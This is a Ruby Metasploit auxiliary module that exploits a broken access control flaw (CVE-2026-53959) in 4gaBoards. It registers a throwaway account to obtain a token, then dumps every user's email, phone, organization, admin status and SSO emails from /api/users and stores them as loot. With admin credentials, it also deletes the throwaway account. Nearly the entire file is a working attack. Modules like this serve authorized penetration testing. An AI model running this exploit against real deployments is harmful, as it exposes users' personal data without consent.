##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Wordpress
  require 'json'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => '4gaBoards Mass User Information Disclosure (CVE-2026-53959)',
        'Description' => %q{
          This module exploits a broken access control vulnerability in 4gaBoards versions 3.3.8 or less.
          The /api/users endpoint allows any authenticated user to enumerate account information for every user.
          Responses expose email, phone, organization, name, isAdmin, ssoGoogleEmail, ssoGithubEmail, and other SSO-linked email fields.

          The module first creates a new user with the supplied email to obtain an access token.
          The access token is then used to dump information of all users registered on the application.
          If valid administrator credentials are provided, the module also performs cleanup by deleting the newly created user account.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Balachandar Gowrisankar'
        ],
        'References' => [
          ['CVE', '2026-53959'],
          ['GHSA', 'p77f-p47g-h72p']
        ],
        'DisclosureDate' => '2026-06-05',
        'Notes' => {
          'Reliability' => UNKNOWN_RELIABILITY,
          'Stability' => UNKNOWN_STABILITY,
          'SideEffects' => UNKNOWN_SIDE_EFFECTS
        }
      )
    )

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'Base path to the 4gaBoards installation', '/']),
        OptString.new('EMAIL', [false, 'Email for account creation', 'test@test.com']),
        OptString.new('ADMIN_USERNAME', [false, 'Administrator username for cleanup', 'demo']),
        OptString.new('ADMIN_PASSWORD', [false, 'Administrator password for cleanup', 'demo'])
      ]
    )
  end

  def run
    print_status("Attempting to register user with email '#{datastore['Email']}'")
    register_url = normalize_uri(
      datastore['TARGETURI'],
      'api',
      'register'
    )
    register_res = send_request_cgi(
      'uri' => register_url,
      'method' => 'POST',
      'headers' => {
        'Content-Type' => 'application/json'
      },
      'data' => {
        'email' => datastore['EMAIL'],
        'password' => 'Password@123!',
        'name' => 'test',
        'policy' => true
      }.to_json
    )
    if register_res && register_res.code == 409
      json_data = register_res.get_json_document
      if json_data.key?('message')
        fail_with(Failure::BadConfig, "#{json_data['message']}. Supply a different email") # Check if email already exists
      end
    elsif register_res && register_res.code == 200
      begin
        json_data = register_res.get_json_document
        if json_data.key?('item')
          access_token = json_data['item']
          print_good("User '#{datastore['EMAIL']}' registered successfully")
          print_good("Access token obtained for user '#{datastore['EMAIL']}'")
        else
          fail_with(Failure::NoAccess, 'User registered but access token not found')
        end
      rescue JSON::ParserError => e
        fail_with(Failure::UnexpectedReply, "Failed to parse JSON response: #{e.message}")
      end
    else
      fail_with(Failure::Unreachable, 'Failed to register user')
    end

    print_status('Dumping all users information')
    users_url = normalize_uri(
      datastore['TARGETURI'],
      'api',
      'users'
    )
    users_res = send_request_cgi(
      'uri' => users_url,
      'method' => 'GET',
      'headers' => {
        'Authorization' => "Bearer #{access_token}"
      }
    )
    if users_res && users_res.code == 200
      begin
        json_data = users_res.get_json_document
        if json_data.key?('items')
          infos = json_data['items']
          for user in infos do
            if user['email'] == datastore['EMAIL']
              del_id = user['id'] # Storing the newly created user's ID to help with account deletion later
            end
          end
          infos.delete_if { |info| info['id'] == del_id } # Removing the newly created user's information from the list
          path = store_loot(
            'user.information',
            'application/json',
            datastore['RHOST'],
            JSON.pretty_generate(infos)
          )
          print_good("Users information saved to: #{path}")
        else
          fail_with(Failure::NoAccess, 'Users information not found in response')
        end
      rescue JSON::ParserError => e
        fail_with(Failure::UnexpectedReply, "Failed to parse JSON response: #{e.message}")
      end
    else
      fail_with(Failure::Unreachable, 'Failed to retrieve users information')
    end
    print_status("Attempting to delete user '#{datastore['EMAIL']}'")
    print_status('Logging in as administrator')
    boundary = "----WebKitFormBoundary#{Rex::Text.rand_text_alphanumeric(16)}"

    data = [
      "--#{boundary}",
      'Content-Disposition: form-data; name="emailOrUsername"',
      '',
      datastore['ADMIN_USERNAME'],
      "--#{boundary}",
      'Content-Disposition: form-data; name="password"',
      '',
      datastore['ADMIN_PASSWORD'],
      "--#{boundary}--",
      ''
    ].join("\r\n")
    login_url = normalize_uri(
      datastore['TARGETURI'],
      'api',
      'access-tokens'
    )
    login_res = send_request_cgi(
      'uri' => login_url,
      'method' => 'POST',
      'ctype' => "multipart/form-data; boundary=#{boundary}",
      'data' => data
    )
    if login_res && login_res.code == 200
      begin
        json_data = login_res.get_json_document
        if json_data.key?('item')
          admin_token = json_data['item']
          print_good('Administrator login successful')
          print_good('Access token obtained for administrator')
        else
          fail_with(Failure::NoAccess, 'Logged in as administrator but access token not found')
        end
      rescue JSON::ParserError => e
        fail_with(Failure::UnexpectedReply, "Failed to parse JSON response: #{e.message}")
      end
    else
      fail_with(Failure::Unreachable, 'Failed to login as administrator')
    end

    del_url = normalize_uri(
      datastore['TARGETURI'],
      'api',
      'users',
      del_id
    )
    del_res = send_request_cgi(
      'uri' => del_url,
      'method' => 'DELETE',
      'headers' => {
        'Authorization' => "Bearer #{admin_token}"
      }
    )
    if del_res && del_res.code == 200
      begin
        json_data = del_res.get_json_document
        if json_data.key?('item')
          print_good("User '#{datastore['EMAIL']}' deleted successfully")
        else
          fail_with(Failure::NoAccess, "Error in deleting user '#{datastore['EMAIL']}'")
        end
      rescue JSON::ParserError => e
        fail_with(Failure::UnexpectedReply, "Failed to parse JSON response: #{e.message}")
      end
    else
      fail_with(Failure::Unreachable, "Failed to delete user '#{datastore['EMAIL']}'")
    end
  end
end
